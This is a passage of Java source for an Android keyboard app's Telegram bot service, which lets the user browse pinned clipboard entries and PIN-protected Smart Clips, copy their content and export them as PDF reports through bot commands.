                        + "🔤 Total chars: <b>" + totalChars + "</b>\n"
                        + "📏 Avg length: <b>" + String.format("%.1f", avg) + " chars</b>\n"
                        + "🕐 Oldest: <b>" + h(oldest) + "</b>\n"
                        + "🕐 Newest: <b>" + h(newest) + "</b>");
            } catch (Exception e) { sendTo(chatId, "❌ Stats error: " + e.getMessage()); }
        }, "TG-stats").start();
    }

    private void cmdLock(long chatId) {
        _pinSessions.remove(chatId);
        SmartClipsService.getInstance(this).lock();
        sendTo(chatId, "🔒 <b>Smart Clips locked.</b> Bot session cleared.");
    }

    // ─────────────────────────────────────────────────────────────────────────
    // /pin — Step 1: Show source chooser
    // ─────────────────────────────────────────────────────────────────────────

    private void cmdPin(long chatId) {
        String text = "📍 <b>Pinned Clips</b>\n"
                + "━━━━━━━━━━━━━━━━━━━━━━\n\n"
                + "Which pinned clips would you like to view?\n\n"
                + "📋 <b>Clipboard History</b> — Clips you've pinned in your clipboard\n"
                + "🔐 <b>Smart Clips</b> — Your Smart Clips collection <i>(PIN required)</i>";
        String kb = "{\"inline_keyboard\":["
                + "[{\"text\":\"📋 Clipboard History (Pinned)\",\"callback_data\":\"pin_cb\"}],"
                + "[{\"text\":\"🔐 Smart Clips (PIN required)\",\"callback_data\":\"pin_sc\"}]]}";
        sendWithMarkup(chatId, text, kb);
    }

    // ─────────────────────────────────────────────────────────────────────────
    // /pin → Clipboard History — pinned entries as tappable buttons
    // ─────────────────────────────────────────────────────────────────────────

    private void doPinnedClipboard(long chatId, int msgId) {
        new Thread(() -> {
            try {
                ClipboardHistoryService cb = ClipboardHistoryService.get_service(this);
                if (cb == null) { editOrSend(chatId, msgId, "❌ Clipboard service not available.", null); return; }

                List<ClipboardHistoryService.HistoryEntry> all = cb.get_history_entries();
                all.sort((a, b) -> b.timestamp.compareTo(a.timestamp));

                // Collect only pinned entries, remember their original index in the sorted list
                List<Integer> pinnedIdxs = new ArrayList<>();
                for (int i = 0; i < all.size(); i++) {
                    if (all.get(i).pinned) pinnedIdxs.add(i);
                }

                if (pinnedIdxs.isEmpty()) {
                    editOrSend(chatId, msgId,
                            "📍 <b>Pinned Clipboard Clips</b>\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
                            + "<i>You have no pinned clipboard entries.</i>\n\n"
                            + "Tip: Long-press a clip in the app and tap 📍 to pin it.", null);
                    return;
                }

                String header = "📍 <b>Pinned Clipboard Clips</b>  <i>("
                        + pinnedIdxs.size() + " pinned)</i>\n"
                        + "━━━━━━━━━━━━━━━━━━━━━━\n"
                        + "<i>Tap any clip for full details &amp; options.</i>";

                StringBuilder kb = new StringBuilder("{\"inline_keyboard\":[");
                for (int idx : pinnedIdxs) {
                    ClipboardHistoryService.HistoryEntry e = all.get(idx);
                    String label = clipLabel(e.content, true);
                    kb.append("[{\"text\":").append(jstr(label))
                      .append(",\"callback_data\":\"rc_").append(idx).append("\"}],");
                }
                // Remove trailing comma
                if (kb.charAt(kb.length() - 1) == ',') kb.setLength(kb.length() - 1);
                kb.append("]}");
                editOrSend(chatId, msgId, header, kb.toString());
            } catch (Exception e) { editOrSend(chatId, msgId, "❌ Error: " + e.getMessage(), null); }
        }, "TG-pin-cb").start();
    }

    // ─────────────────────────────────────────────────────────────────────────
    // /pin → Smart Clips — all Smart Clips as tappable buttons (after PIN)
    // ─────────────────────────────────────────────────────────────────────────

    private void doPinnedSmartClips(long chatId, int msgId) {
        new Thread(() -> {
            try {
                SmartClipsService sc = SmartClipsService.getInstance(this);
                List<SmartClipsService.SmartClip> clips = sc.getClips();

                if (clips == null || clips.isEmpty()) {
                    String noData = "🔐 <b>Smart Clips</b>\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
                            + "<i>No Smart Clips found. Add some in the app!</i>";
                    if (msgId > 0) editOrSend(chatId, msgId, noData, null);
                    else sendTo(chatId, noData);
                    return;
                }

                String header = "🔐 <b>Smart Clips</b>  <i>("
                        + clips.size() + " clip" + (clips.size() == 1 ? "" : "s") + ")</i>\n"
                        + "━━━━━━━━━━━━━━━━━━━━━━\n"
                        + "<i>Tap any clip for full details &amp; options.</i>";

                StringBuilder kb = new StringBuilder("{\"inline_keyboard\":[");
                for (int i = 0; i < clips.size(); i++) {
                    SmartClipsService.SmartClip sc2 = clips.get(i);
                    String display = sc2.locked ? "🔒 [Locked]" : sc2.content;
                    String prefix = sc2.locked ? "🔒 " : (sc2.hidden ? "👁 " : "#" + sc2.serial + " ");
                    String label = prefix + (display.length() > 32
                            ? display.substring(0, 31) + "…"
                            : display).replaceAll("\\s+", " ").trim();
                    kb.append("[{\"text\":").append(jstr(label))
                      .append(",\"callback_data\":\"sc_").append(i).append("\"}],");
                }
                if (kb.charAt(kb.length() - 1) == ',') kb.setLength(kb.length() - 1);
                kb.append("]}");

                if (msgId > 0) editOrSend(chatId, msgId, header, kb.toString());
                else sendWithMarkup(chatId, header, kb.toString());
            } catch (Exception e) {
                String err = "❌ Error: " + e.getMessage();
                if (msgId > 0) editOrSend(chatId, msgId, err, null); else sendTo(chatId, err);
            }
        }, "TG-pin-sc").start();
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Smart Clip detail — shown when user taps any Smart Clip button
    // ─────────────────────────────────────────────────────────────────────────

    private void doSmartClipDetail(long chatId, int msgId, int idx) {
        new Thread(() -> {
            try {
                SmartClipsService sc = SmartClipsService.getInstance(this);
                List<SmartClipsService.SmartClip> clips = sc.getClips();

                if (idx < 0 || clips == null || idx >= clips.size()) {
                    editOrSend(chatId, msgId, "❌ Smart Clip not found.", null); return;
                }
                SmartClipsService.SmartClip clip = clips.get(idx);
                boolean isLocked = clip.locked;
                boolean truncated = !isLocked && clip.content.length() > 500;

                String preview = isLocked ? "🔒 <i>This clip is locked. Content hidden.</i>"
                        : (truncated ? "<code>" + h(clip.content.substring(0, 500)) + "…</code>"
                                     : "<code>" + h(clip.content) + "</code>");

                String text = "🔐 <b>Smart Clip</b>  <i>#" + clip.serial + "</i>\n"
                        + "━━━━━━━━━━━━━━━━━━━━━━\n\n"
                        + preview + "\n\n"
                        + (ok(clip.description) ? "📌 <i>" + h(clip.description) + "</i>\n" : "")
                        + (ok(clip.keyword)     ? "🔑 <i>Keyword: " + h(clip.keyword) + "</i>\n" : "")
                        + (clip.hidden ? "👁 <i>Hidden from widget</i>\n" : "")
                        + (isLocked   ? "🔒 <i>Locked</i>\n" : "")
                        + (ok(clip.timestamp) ? "\n🕐 <i>" + h(clip.timestamp) + "</i>" : "")
                        + (!isLocked ? "\n\n<i>Length: " + clip.content.length() + " chars</i>"
                                       + (truncated ? "  <i>(preview truncated)</i>" : "") : "");

                StringBuilder kb = new StringBuilder("{\"inline_keyboard\":[");
                if (!isLocked) {
                    // Row 1: Copy Content + Description
                    kb.append("[{\"text\":\"📋 Copy Content\",\"callback_data\":\"scp_").append(idx).append("\"},")
                      .append("{\"text\":\"📌 Description\",\"callback_data\":\"scd_").append(idx).append("\"}]");
                    // Row 2: Show Full — only when truncated
                    if (truncated) {
                        kb.append(",[{\"text\":\"🔍 Show Full Content\",\"callback_data\":\"scf_").append(idx).append("\"}]");
                    }
                } else {
                    // Locked clip: show description only
                    kb.append("[{\"text\":\"📌 Description\",\"callback_data\":\"scd_").append(idx).append("\"}]");
                }
                // Back to Smart Clips list
                kb.append(",[{\"text\":\"🔙 Back to Smart Clips\",\"callback_data\":\"bk_sc\"}]]}");
                editOrSend(chatId, msgId, text, kb.toString());
            } catch (Exception e) { editOrSend(chatId, msgId, "❌ Error: " + e.getMessage(), null); }
        }, "TG-sc-detail").start();
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Smart Clip actions — each sends a NEW separate message for easy copying
    // ─────────────────────────────────────────────────────────────────────────

    private void doSmartClipCopy(long chatId, int idx) {
        new Thread(() -> {
            try {
                SmartClipsService sc = SmartClipsService.getInstance(this);
                List<SmartClipsService.SmartClip> clips = sc.getClips();
                if (idx < 0 || clips == null || idx >= clips.size()) {
                    sendTo(chatId, "❌ Smart Clip not found."); return;
                }
                SmartClipsService.SmartClip clip = clips.get(idx);
                if (clip.locked) { sendTo(chatId, "🔒 This clip is locked. Unlock in the app first."); return; }

                String label = "📋 <b>Smart Clip #" + clip.serial + " — Copy Content</b>\n"
                        + "━━━━━━━━━━━━━━━━━━━━━━";
                String content = clip.content;
                int chunkSize = 3800;
                int totalParts = (content.length() + chunkSize - 1) / chunkSize;

                if (totalParts == 1) {
                    sendTo(chatId, label + "\n\n<code>" + h(content) + "</code>");
                } else {
                    sendTo(chatId, label + "\n<i>" + content.length() + " chars — sending in "
                            + totalParts + " parts…</i>");
                    int part = 1;
                    for (int i = 0; i < content.length(); i += chunkSize) {
                        String chunk = content.substring(i, Math.min(i + chunkSize, content.length()));
                        sendTo(chatId, "📄 <b>Part " + part + " / " + totalParts + "</b>\n<code>" + h(chunk) + "</code>");
                        part++;
                        sleep(300);
                    }
                }
            } catch (Exception e) { sendTo(chatId, "❌ Error: " + e.getMessage()); }
        }, "TG-sc-copy").start();
    }

    private void doSmartClipDesc(long chatId, int idx) {
        new Thread(() -> {
            try {
                SmartClipsService sc = SmartClipsService.getInstance(this);
                List<SmartClipsService.SmartClip> clips = sc.getClips();
                if (idx < 0 || clips == null || idx >= clips.size()) {
                    sendTo(chatId, "❌ Smart Clip not found."); return;
                }
                SmartClipsService.SmartClip clip = clips.get(idx);
                String desc = ok(clip.description)
                        ? "<code>" + h(clip.description) + "</code>"
                        : "<i>No description set for Smart Clip #" + clip.serial + ".</i>";
                String kw = ok(clip.keyword)
                        ? "\n🔑 <i>Keyword: <code>" + h(clip.keyword) + "</code></i>"
                        : "";
                sendTo(chatId, "📌 <b>Smart Clip #" + clip.serial + " — Description</b>\n"
                        + "━━━━━━━━━━━━━━━━━━━━━━\n\n"
                        + desc + kw
                        + (ok(clip.timestamp) ? "\n\n🕐 <i>" + h(clip.timestamp) + "</i>" : ""));
            } catch (Exception e) { sendTo(chatId, "❌ Error: " + e.getMessage()); }
        }, "TG-sc-desc").start();
    }

    private void doSmartClipFull(long chatId, int idx) {
        new Thread(() -> {
            try {
                SmartClipsService sc = SmartClipsService.getInstance(this);
                List<SmartClipsService.SmartClip> clips = sc.getClips();
                if (idx < 0 || clips == null || idx >= clips.size()) {
                    sendTo(chatId, "❌ Smart Clip not found."); return;
                }
                SmartClipsService.SmartClip clip = clips.get(idx);
                if (clip.locked) { sendTo(chatId, "🔒 This clip is locked. Unlock in the app first."); return; }

                String content = clip.content;
                int chunkSize = 3800;
                int totalParts = (content.length() + chunkSize - 1) / chunkSize;

                sendTo(chatId, "🔍 <b>Smart Clip #" + clip.serial + " — Full Content</b>\n"
                        + "━━━━━━━━━━━━━━━━━━━━━━\n"
                        + "<i>" + content.length() + " chars"
                        + (totalParts > 1 ? " — sending in " + totalParts + " parts" : "") + "</i>");
                int part = 1;
                for (int i = 0; i < content.length(); i += chunkSize) {
                    String chunk = content.substring(i, Math.min(i + chunkSize, content.length()));
                    String header = totalParts > 1 ? "📄 <b>Part " + part + " / " + totalParts + "</b>\n" : "";
                    sendTo(chatId, header + "<code>" + h(chunk) + "</code>");
                    part++;
                    sleep(300);
                }
            } catch (Exception e) { sendTo(chatId, "❌ Error: " + e.getMessage()); }
        }, "TG-sc-full").start();
    }

    // ─────────────────────────────────────────────────────────────────────────
    // PDF generation
    // ─────────────────────────────────────────────────────────────────────────

    private File buildClipboardPdf() throws Exception {
        ClipboardHistoryService cb = ClipboardHistoryService.get_service(this);
        if (cb == null) return null;
        List<ClipboardHistoryService.HistoryEntry> entries = cb.get_history_entries();
        if (entries.isEmpty()) return null;
        return renderPdf("clipboard_history", "📋  Clipboard History", entries, null);
    }

    private File buildSmartClipsPdf() throws Exception {
        List<SmartClipsService.SmartClip> clips = SmartClipsService.getInstance(this).getClipsForWidget();
        if (clips.isEmpty()) return null;
        return renderPdf("smart_clips", "🔐  Smart Clips", null, clips);
    }

    private File buildAllPdf() throws Exception {
        ClipboardHistoryService cb = ClipboardHistoryService.get_service(this);
        List<ClipboardHistoryService.HistoryEntry> entries = cb != null ? cb.get_history_entries() : new ArrayList<>();
        List<SmartClipsService.SmartClip> clips = SmartClipsService.getInstance(this).getClipsForWidget();
        if (entries.isEmpty() && clips.isEmpty()) return null;
        return renderPdf("full_report", "📦  FullKeyboard Complete Report", entries, clips);
    }

    @SuppressLint("NewApi")
    private File renderPdf(String name, String title,
                           List<ClipboardHistoryService.HistoryEntry> entries,
                           List<SmartClipsService.SmartClip> smartClips) throws Exception {

        final int W = 595, H = 842, M = 40;
        Paint bgP    = paint(0xFFF0F4FF, 0, false);
        Paint hdrP   = paint(0xFF2D3A9A, 0, false);
        Paint cardP  = paint(0xFFFFFFFF, 12, true);
        Paint shadP  = paint(0x1A000000, 12, true);
        Paint barCb  = stroke(0xFF4FC3F7, 3f);
        Paint barSc  = stroke(0xFFA78BFA, 3f);
        Paint titleP = text(0xFFFFFFFF, 22f, true);
        Paint subP   = text(0xCCFFFFFF, 11f, false);
        Paint lblCb  = text(0xFF2D3A9A, 9f, true);
        Paint lblSc  = text(0xFF7A2FA0, 9f, true);
        Paint bodyP  = text(0xFF1A1A2E, 11f, false);
        Paint metaP  = text(0xFF8888AA, 9f, false);
        Paint pinBgP = paint(0xFFFF9D5C, 6, true);
        Paint pinTP  = text(0xFFFFFFFF, 7f, true);
        Paint secBgP = paint(0xFF1A1A3A, 8, false);
        Paint secTP  = text(0xFF4FC3F7, 13f, true);

        PdfDocument doc = new PdfDocument();
        int pageNum = 1;
        PdfDocument.Page page = startPage(doc, pageNum, W, H);
        Canvas cv = page.getCanvas();
        cv.drawRect(0, 0, W, H, bgP);
        cv.drawRect(0, 0, W, 95, hdrP);
        cv.drawText(title, M, 42, titleP);
        String meta = "Generated " + new SimpleDateFormat("dd MMM yyyy HH:mm", Locale.getDefault()).format(new Date());
        if (entries != null && !entries.isEmpty()) meta += "  •  " + entries.size() + " clipboard entries";
        if (smartClips != null && !smartClips.isEmpty()) meta += "  •  " + smartClips.size() + " smart clips";
        cv.drawText(meta, M, 62, subP);
        cv.drawText("FullKeyboard · SystemConsole  —  github.com/neet-ctrl/FullKeyboard-SystemConsole", M, 80, subP);
        float y = 110;

        if (entries != null) {
            for (ClipboardHistoryService.HistoryEntry e : entries) {
                int linesNeeded = Math.min(6, (int) Math.ceil(e.content.length() / 68.0));
                float cardH = 16 + linesNeeded * 14f + 26;
                if (y + cardH + 10 > H - M) {
                    doc.finishPage(page);
                    page = startPage(doc, ++pageNum, W, H);
                    cv = page.getCanvas();
                    cv.drawRect(0, 0, W, H, bgP);
                    y = M;
                }
                float cW = W - 2 * M;
                cv.drawRoundRect(new RectF(M + 2, y + 2, M + cW + 2, y + cardH + 2), 10, 10, shadP);
                cv.drawRoundRect(new RectF(M, y, M + cW, y + cardH), 10, 10, cardP);
                cv.drawLine(M + 1f, y + 7, M + 1f, y + cardH - 7, barCb);
                float cx = M + 14, cy = y + 10;
                cv.drawText("CLIPBOARD", cx, cy + 9, lblCb);
                if (e.pinned) {
                    cv.drawRoundRect(new RectF(cx + 80, cy, cx + 110, cy + 12), 6, 6, pinBgP);
                    cv.drawText("PINNED", cx + 84, cy + 9, pinTP);
                }
                cy += 16;
                String txt = e.content.length() > 408 ? e.content.substring(0, 408) + "…" : e.content;
                while (!txt.isEmpty() && cy < y + cardH - 14) {
                    int cut = Math.min(68, txt.length());
                    cv.drawText(txt.substring(0, cut), cx, cy + 11, bodyP);
                    txt = txt.substring(cut);
                    cy += 13;
                }
                String m2 = "🕐 " + e.timestamp + (ok(e.description) ? "   📌 " + e.description : "");
                if (m2.length() > 90) m2 = m2.substring(0, 90);
                cv.drawText(m2, cx, y + cardH - 5, metaP);
                y += cardH + 8;
            }
        }

        if (smartClips != null && !smartClips.isEmpty()) {
            if (entries != null && !entries.isEmpty()) {
                if (y + 40 > H - M) {
                    doc.finishPage(page);
                    page = startPage(doc, ++pageNum, W, H);
                    cv = page.getCanvas();
                    cv.drawRect(0, 0, W, H, bgP);
                    y = M;
                }
                cv.drawRoundRect(new RectF(M, y, W - M, y + 30), 8, 8, secBgP);
                cv.drawText("  🔐  SMART CLIPS", M + 8, y + 21, secTP);
                y += 42;
            }
            for (SmartClipsService.SmartClip sc : smartClips) {
                int linesNeeded = Math.min(6, (int) Math.ceil(sc.content.length() / 68.0));
                float cardH = 16 + linesNeeded * 14f + 30;
                if (y + cardH + 10 > H - M) {
                    doc.finishPage(page);
                    page = startPage(doc, ++pageNum, W, H);
                    cv = page.getCanvas();
                    cv.drawRect(0, 0, W, H, bgP);
                    y = M;
                }
                float cW = W - 2 * M;
                cv.drawRoundRect(new RectF(M + 2, y + 2, M + cW + 2, y + cardH + 2), 10, 10, shadP);
                cv.drawRoundRect(new RectF(M, y, M + cW, y + cardH), 10, 10, cardP);
                cv.drawLine(M + 1f, y + 7, M + 1f, y + cardH - 7, barSc);
                float cx = M + 14, cy = y + 10;
                cv.drawText("SMART CLIP  #" + sc.serial, cx, cy + 9, lblSc);
                if (sc.locked) cv.drawText("🔒", cx + 130, cy + 9, metaP);
                if (sc.hidden) cv.drawText("👁", cx + 148, cy + 9, metaP);
                cy += 16;
                String txt = sc.content.length() > 408 ? sc.content.substring(0, 408) + "…" : sc.content;
                while (!txt.isEmpty() && cy < y + cardH - 18) {
                    int cut = Math.min(68, txt.length());
                    cv.drawText(txt.substring(0, cut), cx, cy + 11, bodyP);
                    txt = txt.substring(cut);
                    cy += 13;
                }
                String m2 = "#" + sc.serial;
                if (ok(sc.keyword))     m2 += "   🔑 " + sc.keyword;
                if (ok(sc.description)) m2 += "   📌 " + sc.description;
                if (ok(sc.timestamp))   m2 += "   🕐 " + sc.timestamp;
                if (m2.length() > 90)   m2 = m2.substring(0, 90);
                cv.drawText(m2, cx, y + cardH - 5, metaP);
                y += cardH + 8;
            }
        }

        doc.finishPage(page);
        File f = new File(getCacheDir(), name + "_" + System.currentTimeMillis() + ".pdf");
        FileOutputStream fos = new FileOutputStream(f);
        doc.writeTo(fos);
        fos.close();
        doc.close();
        return f;
    }

    private static PdfDocument.Page startPage(PdfDocument doc, int num, int w, int h) {
        return doc.startPage(new PdfDocument.PageInfo.Builder(w, h, num).create());
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Auto-restart
    // ─────────────────────────────────────────────────────────────────────────

    public static void scheduleRestart(Context ctx) {
        Intent i = new Intent(ctx, TelegramBotService.class);
        int flags = PendingIntent.FLAG_UPDATE_CURRENT;
        if (Build.VERSION.SDK_INT >= 23) flags |= PendingIntent.FLAG_IMMUTABLE;
        PendingIntent pi = PendingIntent.getService(ctx, 9876, i, flags);
        AlarmManager am = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
        if (am == null) return;
        long trigger = System.currentTimeMillis() + 5_000L;
        if (Build.VERSION.SDK_INT >= 23) {
            am.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, trigger, pi);
        } else {
            am.setExact(AlarmManager.RTC_WAKEUP, trigger, pi);
        }
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Telegram HTTP helpers
    // ─────────────────────────────────────────────────────────────────────────

    private static String apiUrl(String token) {
        return "https://api.telegram.org/bot" + token;
    }

    /** Send new message or edit existing one, depending on whether msgId > 0. */
    private void editOrSend(long chatId, int msgId, String text, String markup) {
        try {
            if (msgId > 0) {
                editMessage(chatId, msgId, text, markup);
            } else {
                sendWithMarkup(chatId, text, markup);
            }
        } catch (Exception e) {
            Log.w(TAG, "editOrSend: " + e.getMessage());
        }
    }

    private void editMessage(long chatId, int msgId, String text, String markup) {
        try {
            StringBuilder body = new StringBuilder();
            body.append("{\"chat_id\":").append(chatId)
                .append(",\"message_id\":").append(msgId)
                .append(",\"text\":").append(jstr(text))
                .append(",\"parse_mode\":\"HTML\"");
            if (markup != null) body.append(",\"reply_markup\":").append(markup);
            body.append("}");
            postJson(apiUrl(getToken(this)) + "/editMessageText", body.toString());
        } catch (Exception e) { Log.w(TAG, "editMessage: " + e.getMessage()); }
    }

    private void send(String text) { sendTo(getChatId(this), text); }

    public static void sendStatic(String text) {
        TelegramBotService inst = _instance;
        if (inst != null) inst.send(text);
    }

    private void sendTo(long chatId, String text) {
        try {
            String body = "{\"chat_id\":" + chatId
                    + ",\"text\":" + jstr(text)
                    + ",\"parse_mode\":\"HTML\"}";
            postJson(apiUrl(getToken(this)) + "/sendMessage", body);
        } catch (Exception e) { Log.w(TAG, "sendTo: " + e.getMessage()); }
    }

    private void sendWithMarkup(long chatId, String text, String markup) {
        try {
            StringBuilder body = new StringBuilder();
            body.append("{\"chat_id\":").append(chatId)
                .append(",\"text\":").append(jstr(text))
                .append(",\"parse_mode\":\"HTML\"");
            if (markup != null) body.append(",\"reply_markup\":").append(markup);
            body.append("}");
            postJson(apiUrl(getToken(this)) + "/sendMessage", body.toString());
        } catch (Exception e) { Log.w(TAG, "sendWithMarkup: " + e.getMessage()); }
    }

    private void sendDoc(long chatId, File file, String caption) {
        try {
            String boundary = "----TGBnd" + System.currentTimeMillis();
            HttpURLConnection c = (HttpURLConnection) new URL(
                    apiUrl(getToken(this)) + "/sendDocument").openConnection();
            c.setConnectTimeout(30_000);
            c.setReadTimeout(60_000);
            c.setRequestMethod("POST");
            c.setDoOutput(true);
            c.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

            OutputStream out = c.getOutputStream();
            PrintWriter pw = new PrintWriter(new OutputStreamWriter(out, "UTF-8"), true);
            writePart(pw, boundary, "chat_id", String.valueOf(chatId));
            writePart(pw, boundary, "caption", caption);

            pw.append("--").append(boundary).append("\r\n");
            String mime = file.getName().endsWith(".pdf") ? "application/pdf" : "application/json";
            pw.append("Content-Disposition: form-data; name=\"document\"; filename=\"")
              .append(file.getName()).append("\"\r\n");
            pw.append("Content-Type: ").append(mime).append("\r\n\r\n").flush();
            FileInputStream fis = new FileInputStream(file);
            byte[] buf = new byte[4096]; int n;
            while ((n = fis.read(buf)) != -1) out.write(buf, 0, n);
            fis.close();
            out.flush();
            pw.append("\r\n--").append(boundary).append("--\r\n").flush();
            c.getResponseCode();
            c.disconnect();
        } catch (Exception e) { Log.w(TAG, "sendDoc: " + e.getMessage()); }
    }

    private static void writePart(PrintWriter pw, String bnd, String name, String val) {
        pw.append("--").append(bnd).append("\r\n");
        pw.append("Content-Disposition: form-data; name=\"").append(name).append("\"\r\n\r\n");
        pw.append(val).append("\r\n").flush();
    }

    private void answerCb(String id) {
        try { postJson(apiUrl(getToken(this)) + "/answerCallbackQuery",
                "{\"callback_query_id\":\"" + id + "\",\"text\":\"\"}");
        } catch (Exception ignored) {}
    }

    private String httpGet(String url) throws Exception {
        HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
        c.setConnectTimeout(35_000);
        c.setReadTimeout(35_000);
        c.setRequestMethod("GET");
        if (c.getResponseCode() != 200) return null;
        InputStream is = c.getInputStream();
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] buf = new byte[4096]; int n;
        while ((n = is.read(buf)) != -1) baos.write(buf, 0, n);
        return baos.toString("UTF-8");
    }

    private static void postJson(String url, String body) throws Exception {
        HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
        c.setConnectTimeout(12_000); c.setReadTimeout(12_000);
        c.setRequestMethod("POST"); c.setDoOutput(true);
        c.setRequestProperty("Content-Type", "application/json");
        byte[] data = body.getBytes("UTF-8");
        c.setRequestProperty("Content-Length", String.valueOf(data.length));
        OutputStream os = c.getOutputStream(); os.write(data); os.flush();
        c.getResponseCode(); c.disconnect();
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Calendar helper utilities
    // ─────────────────────────────────────────────────────────────────────────

    private List<ClipboardHistoryService.HistoryEntry> getClipsForDay(
            List<ClipboardHistoryService.HistoryEntry> all, int year, int month, int day) {
        List<ClipboardHistoryService.HistoryEntry> result = new ArrayList<>();
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
        for (ClipboardHistoryService.HistoryEntry e : all) {
            try {
                Calendar c = Calendar.getInstance();
                c.setTime(sdf.parse(e.timestamp));
                if (c.get(Calendar.YEAR) == year
                        && (c.get(Calendar.MONTH) + 1) == month
                        && c.get(Calendar.DAY_OF_MONTH) == day)
                    result.add(e);
            } catch (Exception ignored) {}
        }
        result.sort((a, b) -> b.timestamp.compareTo(a.timestamp));
        return result;
    }

    private long countClipsForYear(List<ClipboardHistoryService.HistoryEntry> all, int year) {
        long count = 0;
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
        for (ClipboardHistoryService.HistoryEntry e : all) {
            try {
                Calendar c = Calendar.getInstance();
                c.setTime(sdf.parse(e.timestamp));
                if (c.get(Calendar.YEAR) == year) count++;
            } catch (Exception ignored) {}
        }
        return count;
    }

    /** Build a single-button inline keyboard for a back action. */
    private static String backKb(String callbackData, String label) {
        return "{\"inline_keyboard\":[[{\"text\":" + jstr(label) + ",\"callback_data\":\"" + callbackData + "\"}]]}";
    }

    /** Create a short, readable label for a clip button (max ~35 chars). */
    private static String clipLabel(String content, boolean pinned) {
        String stripped = content.replaceAll("\\s+", " ").trim();
        String prefix = pinned ? "📍 " : "";
        if (stripped.length() > 35) stripped = stripped.substring(0, 34) + "…";
        return prefix + stripped;
    }

    /** Parse "Y_M_D_I" calendar key into int[4]. */
    private static int[] parseCalKey(String s) {
        String[] p = s.split("_", 4);
        int[] v = new int[4];
        for (int i = 0; i < 4 && i < p.length; i++) {
            try { v[i] = Integer.parseInt(p[i]); } catch (Exception e) { v[i] = 0; }
        }
        return v;
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Paint / text factory helpers
    // ─────────────────────────────────────────────────────────────────────────

    private static Paint paint(int color, float radius, boolean antialias) {
        Paint p = new Paint(); p.setColor(color); p.setAntiAlias(antialias); return p;
    }
    private static Paint stroke(int color, float width) {
        Paint p = new Paint(); p.setColor(color); p.setStrokeWidth(width);
        p.setStyle(Paint.Style.STROKE); p.setAntiAlias(true); return p;
    }
    private static Paint text(int color, float sp, boolean bold) {
        Paint p = new Paint(); p.setColor(color); p.setTextSize(sp); p.setAntiAlias(true);
        if (bold) p.setFakeBoldText(true); return p;
    }

    // ─────────────────────────────────────────────────────────────────────────
    // String / JSON utilities
    // ─────────────────────────────────────────────────────────────────────────

    static String h(String s) {
        if (s == null) return "";
        return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;");
    }

    static String jstr(String s) {
        if (s == null) return "\"\"";
        StringBuilder sb = new StringBuilder("\"");
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            switch (c) {
                case '"':  sb.append("\\\""); break;
                case '\\': sb.append("\\\\"); break;
                case '\n': sb.append("\\n");  break;
                case '\r': sb.append("\\r");  break;
                case '\t': sb.append("\\t");  break;
                default:
                    if (c < 0x20) sb.append(String.format("\\u%04x", (int) c));
                    else sb.append(c);
            }
        }
        sb.append("\"");
        return sb.toString();
    }

    static boolean ok(String s) { return s != null && !s.isEmpty(); }

    static int parseInt(String s, int def) {
        try { return Integer.parseInt(s.trim()); } catch (Exception e) { return def; }
    }

    static int p2i(String[] arr, int idx) {
        if (arr == null || idx >= arr.length) return 0;
        return parseInt(arr[idx], 0);
    }

    static void sleep(long ms) {
        try { Thread.sleep(ms); } catch (InterruptedException ignored) {}
    }
}
